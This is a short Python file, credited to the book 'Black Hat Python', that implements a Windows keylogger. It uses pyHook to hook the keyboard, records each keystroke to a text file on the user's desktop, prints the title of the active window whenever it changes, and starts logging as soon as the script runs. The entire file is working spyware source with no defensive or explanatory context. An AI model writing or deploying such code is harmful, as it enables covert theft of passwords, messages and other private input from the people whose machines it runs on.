#Source: Black Hat Python - Justin Seitz
import win32api
import pyHook
import pythoncom
import threading
import sys

logFile = "C:\\Users\\<USER>\\Desktop\\KeyLog.txt"

window = None

def key_event(event):
    global window
    if event.WindowName != window:
        window = event.WindowName
        print(window)
    words = (chr(event.Ascii))
    with open(logFile, 'a') as f:
        f.write(words)
    f.close()
    return True

def main():
    hook = pyHook.HookManager()
    hook.KeyDown = key_event
    hook.HookKeyboard()
    pythoncom.PumpMessages(int())

'''
def main():
    hook = pyHook.HookManager()
    hook.KeyDown = key_event
    hook.HookKeyboard()
    pythoncom.PumpMessages(int())
'''

main()
